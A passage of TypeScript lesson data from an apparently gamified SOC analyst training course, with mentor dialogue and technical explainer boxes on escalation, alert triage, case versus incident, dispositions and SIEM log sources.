            'Tiered SOC Architecture organizes analysts into distinct operational levels (Tier 1 Triage, Tier 2 Incident Response, Tier 3 Threat Hunting, and Shift Lead) to balance incoming alert volume with deep technical investigation.',
          techBoxWhy:
            'Prevents senior forensic investigators from drowning in routine false positives while ensuring complex attacks receive dedicated specialist attention.',
          defaultAnimation: 'm04-soc-hierarchy' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'tier-l1', label: 'TIER 1 (YOU)' },
            { id: 'tier-l2', label: 'TIER 2 (IR)' },
            { id: 'tier-l3', label: 'TIER 3 (HUNTER)' },
            { id: 'tier-lead', label: 'LEAD ANANYA' },
          ],
        },
        {
          index: 1,
          pillarTag: 'PILLAR 02: ESCALATION',
          subPillar: 'DISCIPLINED HANDOFFS',
          heading: 'Escalation Boundaries: A Professional Action, Not a Failure',
          paragraph1:
            'Ananya poses a critical procedural question: "If you reach the edge of your authority during triage, should you silently continue or improvise a fix?"',
          paragraph2:
            'The learner answers correctly: "No. I should explain what I found and request the right help." Ananya nods: "Correct. Escalation is a professional action, not a failure."',
          techBoxTitle: 'TECH BOX: Criteria for Tier 2 Escalation [Details]',
          techBoxAnalogy:
            'A flight dispatcher handing over control to specialized air traffic controllers when severe weather or engine anomalies are detected on radar.',
          techBoxDef:
            'Escalation Boundary is the operational threshold where investigation scope exceeds L1 triage authority—such as active domain privilege escalation, multi-host lateral movement, or ransomware deployment.',
          techBoxWhy:
            'Improvised fixes by unauthorized personnel can destroy critical forensic memory artifacts or alert the adversary that they are being watched.',
          defaultAnimation: 'm04-escalation-triggers' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'esc-boundary', label: 'THRESHOLD' },
            { id: 'esc-privilege', label: 'PRIV ESC ⚠️' },
            { id: 'esc-lateral', label: 'LATERAL ⚠️' },
            { id: 'esc-datacrit', label: 'FIN-DB-01 ⚠️' },
          ],
        },
        {
          index: 2,
          pillarTag: 'PILLAR 03: SHIFT ROTATION',
          subPillar: '24/7/365 OPERATIONS',
          heading: '24/7 Shift Rotation & The Overlap Window',
          paragraph1:
            'Security operations never sleep. Enterprise environments rotate across 3 eight-hour shifts: Day Shift Alpha (07:00-15:30), Swing Shift Bravo (15:00-23:30), and Night Watch Charlie (23:00-07:30).',
          paragraph2:
            'Each shift includes a mandatory 30-minute operational overlap window where outgoing analysts verbally brief incoming analysts on active investigations, ongoing outages, and open tickets.',
          techBoxTitle: 'TECH BOX: Shift Handover & Operational Continuity [Details]',
          techBoxAnalogy:
            'A continuous 4x100m relay race: the baton must be securely placed directly into the next runner’s hand during the designated passing zone before letting go.',
          techBoxDef:
            'Shift Overlap Window is the structured transition period ensuring zero knowledge loss between departing and arriving SOC shifts through synchronized log reviews and ticket assignments.',
          techBoxWhy:
            'Unbriefed shift transitions are the #1 operational vulnerability where critical alerts get neglected or assumed to be handled by someone else.',
          defaultAnimation: 'm04-shift-wheel' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'shift-day', label: 'DAY ALPHA' },
            { id: 'shift-swing', label: 'SWING BRAVO' },
            { id: 'shift-night', label: 'NIGHT CHARLIE' },
            { id: 'shift-handover', label: 'HANDOVER ↻' },
          ],
        },
      ];
    }

    // 2. M04-U1-C2: Alert queue, triage and ownership
    if (chId === 'M04-U1-C2') {
      return [
        {
          index: 0,
          pillarTag: 'PILLAR 01: QUEUE INGESTION',
          subPillar: 'PRIORITY-DRIVEN INTAKE',
          heading: 'Alert Queue Ingestion & Priority Tiers',
          paragraph1:
            'Simulated alerts flood into the queue banner: P1 Critical ransomware triggers, P2 High off-hours activity involving FIN-OPS-01, and P3 Medium port sweeps.',
          paragraph2:
            'When the apprentice asks if they should pick the easiest alerts first, Ananya replies firmly: "No. Follow queue priorities and service targets, and notify the lead when workload threatens them."',
          techBoxTitle: 'TECH BOX: Severity Matrix & Queue Disciplines [Details]',
          techBoxAnalogy:
            'Hospital triage queue: a cardiac arrest patient (P1) is treated ahead of a broken arm (P2) or mild cough (P3), regardless of arrival order.',
          techBoxDef:
            'Priority Ingestion Queuing classifies inbound security alerts into deterministic severity tiers (P1 to P4) based on asset criticality, threat type, and business impact.',
          techBoxWhy:
            'Prevents alert fatigue from obscuring active enterprise-wide compromises under mountains of low-severity telemetry noise.',
          defaultAnimation: 'm04-queue-ingestion' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'queue-sev1', label: 'P1 CRITICAL' },
            { id: 'queue-sev2', label: 'P2 HIGH' },
            { id: 'queue-sev3', label: 'P3 MEDIUM' },
            { id: 'queue-claim', label: 'CLAIM ITEM' },
          ],
        },
        {
          index: 1,
          pillarTag: 'PILLAR 02: TICKET LIFECYCLE',
          subPillar: 'ASSIGNMENT & AUDIT',
          heading: 'Ticket Lifecycle: Claiming Single Ownership',
          paragraph1:
            'Ananya guides your cursor: "First claim the assigned item according to workflow. Check its age and priority, and review the approved playbook."',
          paragraph2:
            'When asked why the next analyst needs to know who owns an alert, the learner explains: "To avoid both duplicate effort and neglected work." Ananya nods: "Reliable operations start before technical investigation."',
          techBoxTitle: 'TECH BOX: Incident Ticket State Transitions [Details]',
          techBoxAnalogy:
            'Taking an order ticket in a restaurant kitchen: pinning it to your prep station signals you are cooking it so two chefs don’t cook the same meal while other tables wait.',
          techBoxDef:
            'Ticket Lifecycle tracks security cases through state transitions: New → Claimed / In Progress → Pending External → Closed / Escalated, enforcing explicit individual accountability.',
          techBoxWhy:
            'Eliminates unassigned "orphan alerts" and prevents contradictory actions being taken by multiple analysts simultaneously.',
          defaultAnimation: 'm04-ticket-lifecycle' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'life-new', label: '1. NEW' },
            { id: 'life-progress', label: '2. CLAIMED' },
            { id: 'life-pending', label: '3. PENDING' },
            { id: 'life-closed', label: '4. CLOSED ✓' },
          ],
        },
        {
          index: 2,
          pillarTag: 'PILLAR 03: SLA METRICS',
          subPillar: 'OPERATIONAL TIMERS',
          heading: 'SLA Timers: MTTD, MTTA & MTTR',
          paragraph1:
            'Every claimed alert runs against strict Service Level Agreement (SLA) timers. Mean Time to Acknowledge (MTTA) mandates claiming within 15 minutes; Mean Time to Respond (MTTR) requires containment within 60 minutes.',
          paragraph2:
            'Timer bars tick in real time on the analyst HUD. If an alert approaches breach threshold, automated notifications warn the shift lead to rebalance queue workload across the team.',
          techBoxTitle: 'TECH BOX: SOC Performance Metrics & Breach Thresholds [Details]',
          techBoxAnalogy:
            'Fire department dispatch timers: 60 seconds to answer 911 (MTTA), 4 minutes to roll trucks out the bay door, and 8 minutes to arrive on scene.',
          techBoxDef:
            'Service Level Agreement (SLA) benchmarks quantify operational velocity across MTTD (Detection), MTTA (Acknowledgment), and MTTR (Resolution / Containment).',
          techBoxWhy:
            'Minimizes adversary dwell time—the window between initial network penetration and active data exfiltration or ransomware encryption.',
          defaultAnimation: 'm04-sla-monitor' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'sla-mttd', label: 'MTTD (12m)' },
            { id: 'sla-mtta', label: 'MTTA (8m)' },
            { id: 'sla-mttr', label: 'MTTR (42m)' },
            { id: 'sla-breach', label: 'BREACH RISK ⚠️' },
          ],
        },
      ];
    }

    // 3. M04-U2-C1: Event versus alert
    if (chId === 'M04-U2-C1') {
      return [
        {
          index: 0,
          pillarTag: 'PILLAR 01: TELEMETRY FUNNEL',
          subPillar: 'EVENT VS ALERT',
          heading: 'Telemetry Funnel: Raw Event vs Correlated Alert',
          paragraph1:
            'Mentor Ananya brings up the ingestion stream: "An event records something that happened. An alert highlights activity that meets detection conditions."',
          paragraph2:
            'Ten million raw log events enter the SIEM daily—file reads, DHCP leases, successful web requests. The correlation engine sifts through this ocean to generate 50 high-fidelity alerts that require human analyst judgment.',
          techBoxTitle: 'TECH BOX: The 10,000:1 Funnel Ratio [Details]',
          techBoxAnalogy:
            'Security cameras recording 24 hours of empty hallway footage (Events) versus the motion detector sounding a chime when a person walks past after midnight (Alert).',
          techBoxDef:
            'Security Event is an observable occurrence in a system or network; a Security Alert is an event or aggregation of events flagged by automated rules as potentially violating security policy.',
          techBoxWhy:
            'Human analysts cannot review millions of raw records per second; correlation rules filter telemetry into actionable investigation signals.',
          defaultAnimation: 'm04-event-vs-alert' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'eva-event', label: 'RAW EVENT' },
            { id: 'eva-pipeline', label: 'RULE ENGINE' },
            { id: 'eva-alert', label: 'ALERT ▲' },
            { id: 'eva-ratio', label: '10,000:1 FUNNEL' },
          ],
        },
        {
          index: 1,
          pillarTag: 'PILLAR 02: DETECTION RULES',
          subPillar: 'BOOLEAN CORRELATION',
          heading: 'Correlation Rule Logic: EventIDs, Timestamps & Thresholds',
          paragraph1:
            'How does an event become an alert? Correlation rules evaluate specific logical conditions across structured fields: `EventID == 4624 (Logon)` AND `LogonType == 2 (Interactive)` AND `Time NOT BETWEEN 09:00 AND 17:00`.',
          paragraph2:
            'When all conditions evaluate to TRUE simultaneously, the engine fires a compound alert titled "Off-Hours Interactive Console Logon Detected on Branch Workstation".',
          techBoxTitle: 'TECH BOX: SIEM Correlation Rule Logic [Details]',
          techBoxAnalogy:
            'A bank vault alarm that trips only if the door is opened (Condition 1) AND the security code was not disarmed within 30 seconds (Condition 2).',
          techBoxDef:
            'Correlation Rule Engine executes stateful Boolean queries across streaming telemetry streams, linking disparate host, network, and identity events into composite alerts.',
          techBoxWhy:
            'Filters out normal isolated operations while detecting complex multi-stage attack patterns that no single log entry could reveal.',
          defaultAnimation: 'm04-rule-logic-engine' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'rule-eventid', label: 'EVENTID: 4624' },
            { id: 'rule-time', label: 'OFF-HOURS GATE' },
            { id: 'rule-host', label: 'TARGET HOST' },
            { id: 'rule-trigger', label: 'RULE FIRED 🔔' },
          ],
        },
        {
          index: 2,
          pillarTag: 'PILLAR 03: VERDICT TRAP',
          subPillar: 'DISCIPLINED RESTRAINT',
          heading: 'The Premature Verdict Trap & Evidence Anchor',
          paragraph1:
            'When the alert fires, the apprentice asks: "Does an alert mean the account is compromised?" Ananya cautions: "Not automatically. A rule identifies something worth checking; context determines what we can conclude."',
          paragraph2:
            'Novice analysts fall into the verdict trap—assuming the alert title is an indisputable finding. Disciplined analysts anchor every claim in verifiable evidence before assigning blame or closing tickets.',
          techBoxTitle: 'TECH BOX: Cognitive Bias in Security Triage [Details]',
          techBoxAnalogy:
            'A smoke detector beeping in an apartment: it could be a kitchen fire, burnt toast, or a low 9V battery. You check the stove before evacuating the entire building.',
          techBoxDef:
            'Premature Verdict Trap occurs when an investigator uncritically accepts an automated alert label as a confirmed security incident without validating corroborating facts.',
          techBoxWhy:
            'Preserves credibility and prevents disruptive false alarms, unauthorized account lockouts, or panic in corporate branch offices.',
          defaultAnimation: 'm04-verdict-trap' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'trap-title', label: 'ALERT TITLE LURE' },
            { id: 'trap-bias', label: 'COGNITIVE BIAS' },
            { id: 'trap-anchor', label: 'EVIDENCE ANCHOR' },
            { id: 'trap-disciplined', label: 'FACT FINDING ✓' },
          ],
        },
      ];
    }

    // 4. M04-U2-C2: Incident versus case
    if (chId === 'M04-U2-C2') {
      return [
        {
          index: 0,
          pillarTag: 'PILLAR 01: TAXONOMY QUAD',
          subPillar: 'EVENT, ALERT, CASE & INCIDENT',
          heading: 'Incident Taxonomy: Event, Alert, Case & Incident',
          paragraph1:
            'Ananya introduces the four taxonomy tiers: "A case is a work record. An incident is a security situation meeting the organisation\'s formal incident criteria."',
          paragraph2:
            'When asked if a case can exist before an incident is confirmed, Ananya responds: "Yes. It can track investigation of activity that later proves benign, malicious, or still uncertain."',
          techBoxTitle: 'TECH BOX: Digital Forensics & Incident Response Taxonomy [Details]',
          techBoxAnalogy:
            'A medical patient chart (Case) opened when symptoms appear (Alerts), which may conclude with a common cold (Benign) or a declared surgery emergency (Incident).',
          techBoxDef:
            'Security Incident is an assessed occurrence that actually or potentially jeopardizes confidentiality, integrity, or availability; a Case is an administrative investigative record containing evidence.',
          techBoxWhy:
            'Opening a case does NOT mean the enterprise was hacked. Confusing cases with incidents causes false regulatory disclosures and enterprise panic.',
          defaultAnimation: 'm04-taxonomy-quad' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'quad-event', label: '1. EVENT' },
            { id: 'quad-alert', label: '2. ALERT' },
            { id: 'quad-case', label: '3. CASE RECORD' },
            { id: 'quad-incident', label: '4. INCIDENT ⚠️' },
          ],
        },
        {
          index: 1,
          pillarTag: 'PILLAR 02: CASE AGGREGATION',
          subPillar: 'CORRELATING CLUES',
          heading: 'Case Aggregation: Multi-Alert Correlation',
          paragraph1:
            'An alert rarely travels alone. Ananya links two incoming alerts to Case #2026-881: Alert 101 (Off-Hours Logon on BLR-BR-WS-04) and Alert 102 (Suspicious LOLBIN certutil.exe execution).',
          paragraph2:
            'An unrelated Alert 103 (Printer spooler failure on BLR-BR-WS-09) is kept strictly separate. Correlating related signals builds a coherent forensic timeline of adversary behavior.',
          techBoxTitle: 'TECH BOX: Case Management & Artifact Grouping [Details]',
          techBoxAnalogy:
            'A detective pinning crime scene photos, fingerprint cards, and phone records onto a single corkboard dossier for one specific burglary.',
          techBoxDef:
            'Case Aggregation groups multiple alerts, host artifacts, and user telemetry sharing common entities (hostname, IP, account, or timestamp window) into a unified investigation dossier.',
          techBoxWhy:
            'Enables analysts to detect attack kill-chains that appear innocuous when viewed as disconnected individual alerts.',
          defaultAnimation: 'm04-case-aggregation' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'agg-alert1', label: 'ALERT 1: LOGON' },
            { id: 'agg-alert2', label: 'ALERT 2: LOLBIN' },
            { id: 'agg-case-container', label: 'CASE #2026-881' },
            { id: 'agg-timeline', label: 'TIMELINE VIEW' },
          ],
        },
        {
          index: 2,
          pillarTag: 'PILLAR 03: EVIDENCE VAULT',
          subPillar: 'FORENSIC PRESERVATION',
          heading: 'Evidence Vault & Chain of Custody',
          paragraph1:
            'Evidence stored within a case must withstand legal and audit scrutiny. Every packet capture, log extract, and memory dump is hashed with SHA-256 and locked into read-only storage.',
          paragraph2:
            'Ananya reminds you: "Our record must not claim more certainty than our evidence supports." Working copies are created for analysis while original bit-streams remain permanently untouched.',
          techBoxTitle: 'TECH BOX: Chain of Custody & Evidence Integrity [Details]',
          techBoxAnalogy:
            'Sealing physical evidence into a tamper-evident plastic bag signed and dated by the investigating officer.',
          techBoxDef:
            'Chain of Custody is a chronological documentation trail recording the acquisition, custody, transfer, analysis, and disposition of digital evidence (ISO/IEC 27037).',
          techBoxWhy:
            'Guarantees that investigation findings cannot be challenged or dismissed during internal disciplinary reviews or legal court proceedings.',
          defaultAnimation: 'm04-evidence-vault' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'vault-hashes', label: 'SHA-256 HASH' },
            { id: 'vault-snapshots', label: 'MEMORY DUMP' },
            { id: 'vault-custody', label: 'CUSTODY LOG' },
            { id: 'vault-preservation', label: 'LOCKED VAULT 🔒' },
          ],
        },
      ];
    }

    // 5. M04-U3-C1: Identify user, host, IP, time and count
    if (chId === 'M04-U3-C1') {
      return [
        {
          index: 0,
          pillarTag: 'PILLAR 01: THE 5 WS',
          subPillar: 'TRIAGE FOUNDATION',
          heading: 'The 5 Ws Triage Framework: Who, What, When, Where, Why',
          paragraph1:
            'Ananya opens the expanded alert card: "Verify user, host, IP, and timestamps. Also check what was counted and how the detection window was defined."',
          paragraph2:
            'Every triage starts by extracting five core coordinates: WHO (Account FIN-OPS-01), WHAT (certutil.exe download), WHEN (02:45:10 UTC), WHERE (10.10.20.15 → 185.220.101.4), and WHY (Investigation pending).',
          techBoxTitle: 'TECH BOX: The 5 Ws Security Triage Model [Details]',
          techBoxAnalogy:
            'A police dispatcher gathering caller information: Who is reporting, What happened, When did it occur, Where is the location, and Why is assistance needed.',
          techBoxDef:
            'The 5 Ws of Security Triage is a structured qualification method ensuring analysts extract all critical telemetry facets before determining triage disposition.',
          techBoxWhy:
            'Prevents incomplete escalations that force Tier 2 specialists to waste hours re-gathering basic host and network identifiers.',
          defaultAnimation: 'm04-five-ws-triage' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'five-who', label: 'WHO (ACCOUNT)' },
            { id: 'five-what', label: 'WHAT (EXECUTION)' },
            { id: 'five-when', label: 'WHEN (UTC TIME)' },
            { id: 'five-where', label: 'WHERE (IP & HOST)' },
          ],
        },
        {
          index: 1,
          pillarTag: 'PILLAR 02: AGGREGATION',
          subPillar: 'COUNTS & DETECTION WINDOWS',
          heading: 'Aggregation Counters & Detection Windows',
          paragraph1:
            'When the alert notes "20 Failed Logons", the learner asks: "Does that mean twenty different people?" Ananya replies: "No. Counts describe the rule\'s aggregation, which you must inspect."',
          paragraph2:
            'A sliding time window groups repeated events. 20 attempts in 60 seconds from one IP indicates an automated password spray; 20 attempts across 5 days indicates a user forgetting their password.',
          techBoxTitle: 'TECH BOX: Sliding Window Aggregations & Noise Suppression [Details]',
          techBoxAnalogy:
            'A turnstile counter clicking 50 times in 1 minute (a tour bus arriving) versus 50 clicks over an entire afternoon (normal foot traffic).',
          techBoxDef:
            'Sliding Window Aggregation counts occurrences of specific event criteria over a rolling time interval (t), emitting an alert only when the event frequency exceeds a defined threshold.',
          techBoxWhy:
            'Suppresses low-volume benign telemetry while catching high-velocity brute force attacks and port sweeps in real time.',
          defaultAnimation: 'm04-aggregation-counter' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'agg-count-raw', label: 'EVENT STREAM' },
            { id: 'agg-count-bucket', label: '60s BUCKET' },
            { id: 'agg-count-threshold', label: 'THRESHOLD: 5' },
            { id: 'agg-count-fire', label: 'ALERT FIRED ⚡' },
          ],
        },
        {
          index: 2,
          pillarTag: 'PILLAR 03: FORENSIC HONESTY',
          subPillar: 'FACTS VS PRESUMPTIONS',
          heading: 'Forensic Honesty: Verified Facts vs Presumptions',
          paragraph1:
            'Ananya poses a vital test: "If the reason for the activity is not known, what goes in the \'why\' field?" The learner answers: "Unknown, with a note about what could help verify it."',
          paragraph2:
            'Ananya approves warmly: "Correct. The five W\'s are questions, not permission to guess missing answers." Never invent motives or fabricate facts to make a triage note appear complete.',
          techBoxTitle: 'TECH BOX: The Principle of Forensic Honesty [Details]',
          techBoxAnalogy:
            'A courtroom witness swearing to tell only what they personally saw and heard, without speculating on what the defendant was thinking.',
          techBoxDef:
            'Forensic Honesty is the analytical discipline of explicitly distinguishing verified observables from unproven assumptions, hypotheses, and unknowns in security records.',
          techBoxWhy:
            'Fabricated assumptions mislead incident responders and derail containment strategies, allowing adversaries to remain undetected.',
          defaultAnimation: 'm04-forensic-honesty' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'hon-who-known', label: 'KNOWN ACCOUNT' },
            { id: 'hon-who-unknown', label: 'UNKNOWN HUMAN' },
            { id: 'hon-why-unknown', label: 'WHY: UNKNOWN' },
            { id: 'hon-doctrine', label: 'NO GUESSING ✓' },
          ],
        },
      ];
    }

    // 6. M04-U3-C2: Context, disposition and analyst notes
    if (chId === 'M04-U3-C2') {
      return [
        {
          index: 0,
          pillarTag: 'PILLAR 01: DISPOSITION',
          subPillar: 'STANDARDIZED LABELS',
          heading: 'The Disposition Tree: TP Malicious, TP Benign, FP & Undetermined',
          paragraph1:
            'Every investigated alert concludes with a formal disposition: True Positive Malicious (confirmed attack), True Positive Benign (authorized admin task), False Positive (rule logic flaw), or Undetermined.',
          paragraph2:
            'Ananya instructs: "Distinguish an incorrect detection from correctly detected activity that is authorised or benign. Each conclusion needs its own evidence."',
          techBoxTitle: 'TECH BOX: Standardized Triage Dispositions [Details]',
          techBoxAnalogy:
            'A medical diagnostic outcome: Confirmed Infection (TP Malicious), Vaccine Reaction (TP Benign), Faulty Test Kit (False Positive), or Inconclusive Lab (Undetermined).',
          techBoxDef:
            'Triage Disposition is the verified categorical classification assigned to a closed or escalated alert reflecting its security validity and organizational impact.',
          techBoxWhy:
            'Ensures tuning feedback loops: False Positives route to detection engineers to refine rules, while True Positives trigger threat intelligence updates.',
          defaultAnimation: 'm04-disposition-tree' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'disp-tp-mal', label: 'TP MALICIOUS ⚠️' },
            { id: 'disp-tp-ben', label: 'TP BENIGN ✓' },
            { id: 'disp-fp', label: 'FALSE POSITIVE' },
            { id: 'disp-undet', label: 'UNDETERMINED' },
          ],
        },
        {
          index: 1,
          pillarTag: 'PILLAR 02: HANDOVER NOTE',
          subPillar: 'SHIFT CONTINUITY',
          heading: 'Anatomy of an Actionable Shift Handover Note',
          paragraph1:
            'When the shift ends, open investigations must transition cleanly. An action-oriented handover note contains 4 mandatory sections: Executive Summary & Case ID, Verified Facts, Actions Taken, and Next Pending Steps.',
          paragraph2:
            'The learner asks: "Can I close the finance case because another alert had an innocent explanation?" Ananya warns: "No. Each case requires its own verified evidence."',
          techBoxTitle: 'TECH BOX: Shift Handover Documentation Standards [Details]',
          techBoxAnalogy:
            'A hospital nurse shift report: Patient vitals, administered medications, pending lab results, and specific alarms the next nurse must watch for.',
          techBoxDef:
            'Shift Handover Note is a structured operational document transferring ownership of open investigations between analysts without ambiguity or dropped tasks.',
          techBoxWhy:
            'Guarantees that an ongoing slow-and-low adversary intrusion is not lost or ignored during shift changes or weekend lulls.',
          defaultAnimation: 'm04-handover-note-anatomy' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'hand-summary', label: '1. SUMMARY' },
            { id: 'hand-facts', label: '2. FACTS' },
            { id: 'hand-actions', label: '3. ACTIONS' },
            { id: 'hand-next', label: '4. NEXT STEPS' },
          ],
        },
        {
          index: 2,
          pillarTag: 'PILLAR 03: ESCALATION PACKAGE',
          subPillar: 'SUPERVISED REVIEW',
          heading: 'Formal Escalation Package & Chain of Custody',
          paragraph1:
            'When an investigation confirms malicious activity or exceeds L1 boundaries, the analyst packages the case for Tier 2 escalation. The package includes raw logs, hashes, process trees, and notes.',
          paragraph2:
            'Shift Lead Ananya conducts the supervisory review: "Low confidence does not mean low priority. Potential impact may still require urgent escalation." The finance case moves to supervised Tier 2 review.',
          techBoxTitle: 'TECH BOX: Case Escalation Dossier & Supervisory Sign-Off [Details]',
          techBoxAnalogy:
            'A formal legal brief prepared by junior paralegals containing certified evidence binders for senior trial attorneys.',
          techBoxDef:
            'Escalation Package is a cryptographically validated dossier of host, user, and network observables delivered to Tier 2/Incident Responders under verified chain of custody.',
          techBoxWhy:
            'Provides Tier 2 responders with instant forensic context, cutting investigation start times from hours to minutes during active crises.',
          defaultAnimation: 'm04-evidence-package' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'pkg-bundle', label: 'EVIDENCE DOSSIER' },
            { id: 'pkg-lead-review', label: 'LEAD REVIEW ✓' },
            { id: 'pkg-tier2-transfer', label: 'TIER 2 HANDOFF' },
            { id: 'pkg-audit-trail', label: 'AUDIT LEDGER' },
          ],
        },
      ];
    }

    // =========================================================================
    // MODULE 05: SIEM FUNDAMENTALS & SEARCH (CDAC Bengaluru Training SOC)
    // =========================================================================

    // 1. M05-U1-C1: What SIEM does and does not do
    if (chId === 'M05-U1-C1') {
      return [
        {
          index: 0,
          pillarTag: 'PILLAR 01: SIEM CAPABILITIES',
          subPillar: 'CENTRAL TELEMETRY',
          heading: 'SIEM Core Capabilities: Aggregation, Correlation & Search',
          paragraph1:
            'Mentor Karthik meets the apprentice in the log services teaching zone at CDAC Bengaluru: "A SIEM brings security-relevant records together and supports searching, detection, and investigation."',
          paragraph2:
            'Hundreds of thousands of events flow from endpoints, domain controllers, and firewalls into sharded indexers. The correlation engine evaluates multi-source patterns in sliding time windows, outputting prioritized alerts for L1 triage.',
          techBoxTitle: 'TECH BOX: Security Information and Event Management (SIEM) [Details]',
          techBoxAnalogy:
            'Like an airport air traffic control tower: radar feeds from dozens of ground sensors, weather balloons, and aircraft transponders converge onto a single display console.',
          techBoxDef:
            'SIEM (NIST SP 800-92) provides real-time analysis of security alerts generated by applications and network hardware through centralized aggregation, correlation, and compliance auditing.',
          techBoxWhy:
            'Eliminates data silos so an analyst can trace an attack across identities, endpoints, and perimeter firewalls from a single screen.',
          defaultAnimation: 'm05-siem-capabilities' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'cap-aggregate', label: '1. AGGREGATE' },
            { id: 'cap-correlate', label: '2. CORRELATE' },
            { id: 'cap-search', label: '3. SEARCH' },
            { id: 'cap-alert', label: '4. ALERT ▲' },
          ],
        },
        {
          index: 1,
          pillarTag: 'PILLAR 02: VISIBILITY GAPS',
          subPillar: 'THE BLINDSPOT TRAP',
          heading: 'The Visibility Gap: Uncollected Sources & Retention Limits',
          paragraph1:
            'When the learner asks if the SIEM can see everything that happened, Karthik clarifies: "Only what its sources and integrations provide. Missing collection, retention limits, or parsing problems can leave gaps."',
          paragraph2:
            'While domain controllers and endpoints stream telemetry reliably, uncollected sources like branch Wi-Fi controllers or 7-day proxy retention purges create dangerous blind spots where adversaries operate undetected.',
          techBoxTitle: 'TECH BOX: Architectural Visibility Gaps & Data Coverage [Details]',
          techBoxAnalogy:
            'A security camera system that covers the front lobby and bank vault perfectly, but has no camera installed in the side emergency staircase.',
          techBoxDef:
            'Visibility Gap is a blind spot in security monitoring caused by uninstrumented endpoints, unforwarded log streams, or truncated retention windows that impede incident reconstruction.',
          techBoxWhy:
            'An empty search result never proves innocence if the target device never sent its logs to the SIEM in the first place.',
          defaultAnimation: 'm05-visibility-gaps' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'gap-covered', label: '100% COVERED' },
            { id: 'gap-uncollected', label: 'BLIND SPOT ⚠️' },
            { id: 'gap-blindspot', label: 'PURGE WINDOW' },
            { id: 'gap-audit', label: 'AUDIT LEDGER' },
          ],
        },
        {
          index: 2,
          pillarTag: 'PILLAR 03: SCOPE DOCTRINE',
          subPillar: 'DISCIPLINED INVESTIGATION',
          heading: 'Scope-Bounded Search Doctrine: Evidence Within Known Scope',
          paragraph1:
            'Karthik tests the apprentice: "Does an empty search prove that an activity never happened?" The learner answers: "No. I must check the search and data coverage."',
          paragraph2:
            'Karthik nods approvingly: "Correct. A search result is evidence within a known scope." Disciplined analysts state verified boundaries: "Within Sysmon logs between 02:00 and 03:00 UTC, no execution was found."',
          techBoxTitle: 'TECH BOX: Scope-Bounded Forensic Reporting [Details]',
          techBoxAnalogy:
            'Searching your living room for missing keys and reporting: "The keys are not in the living room," rather than declaring: "The keys no longer exist anywhere in the world."',
          techBoxDef:
            'Scope-Bounded Search Doctrine requires analysts to evaluate time window alignment, time zones, field schema matching, and sensor health before drawing conclusions from negative search results.',
          techBoxWhy:
            'Prevents catastrophic false negatives where an analyst dismisses a breach simply because their time picker looked at the wrong hour.',
          defaultAnimation: 'm05-scope-doctrine' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'doc-empty-search', label: '0 RESULTS TRAP' },
            { id: 'doc-coverage-check', label: '1. SENSOR HEALTH' },
            { id: 'doc-scope-verify', label: '2. ALIGN UTC' },
            { id: 'doc-disciplined', label: '3. BOUND CONCLUSION' },
          ],
        },
      ];
    }

    // 2. M05-U1-C2: Log sources and ingestion concepts
    if (chId === 'M05-U1-C2') {
      return [
        {
          index: 0,
          pillarTag: 'PILLAR 01: SENSOR ECOSYSTEM',
          subPillar: 'SPECIALIZED COLLECTORS',
          heading: 'Multi-Source Telemetry: Sysmon, Winlogbeat & Zeek',
          paragraph1:
            'Karthik maps the sensor ecosystem: "Sysmon produces host telemetry; Winlogbeat can ship Windows event logs; Zeek generates network telemetry from observed traffic."',
          paragraph2:
            'The learner asks if they are interchangeable endpoint agents. Karthik explains: "No. Different sources generate or forward different evidence before parsing and storage."',
          techBoxTitle: 'TECH BOX: Specialized Telemetry Collectors [Details]',
          techBoxAnalogy:
            'Medical diagnostics: a heart rate monitor (Zeek wire tap), an MRI scanner (Sysmon kernel inspection), and an electronic health record clerk (Winlogbeat shipper).',
          techBoxDef:
            'Telemetry Collectors encompass kernel sensors (Sysmon), event log shippers (Winlogbeat/Fluentbit), and passive wire inspectors (Zeek) that capture operational host and network observables.',
          techBoxWhy:
            'Combining kernel process telemetry with network session data enables complete kill-chain reconstruction from initial download to execution.',
          defaultAnimation: 'm05-source-ecosystem' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'src-sysmon', label: 'SYSMON (HOST)' },
            { id: 'src-winlogbeat', label: 'WINLOGBEAT' },
            { id: 'src-zeek', label: 'ZEEK (NETWORK)' },
            { id: 'src-syslog', label: 'SYSLOG (PORT 514)' },
          ],
        },
        {
          index: 1,
          pillarTag: 'PILLAR 02: INGESTION PIPELINE',
          subPillar: '6-STAGE TELEMETRY ROUTE',
          heading: 'The 6-Stage Telemetry Ingestion Conduit',
          paragraph1:
            'Telemetry journeys through 6 deterministic stages: Event Generation → Local Collection → mTLS Transport → Parsing & Schema Tokenization → Lucene Indexing → Analyst Search Head.',
          paragraph2:
            'From remote workstation BLR-BR-WS-04 across the branch WAN into the central indexing cluster, total ingestion latency averages just 3.2 seconds under nominal load.',
          techBoxTitle: 'TECH BOX: End-to-End Log Ingestion Pipeline [Details]',
          techBoxAnalogy:
            'A postal logistics pipeline: letter written (Generation), dropped in mailbox (Collection), transport truck (Transport), sorting facility (Parsing), and filing into PO boxes (Indexing).',
          techBoxDef:
            'Ingestion Pipeline is the streaming architectural conduit that ingests, buffers, parses, enriches, and writes security event records into queryable indices.',
          techBoxWhy:
            'Guarantees sub-5-second analyst search availability while disk-spooling buffers protect against telemetry loss during network drops.',
          defaultAnimation: 'm05-ingestion-pipeline' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'pipe-source', label: '1. GENERATION' },
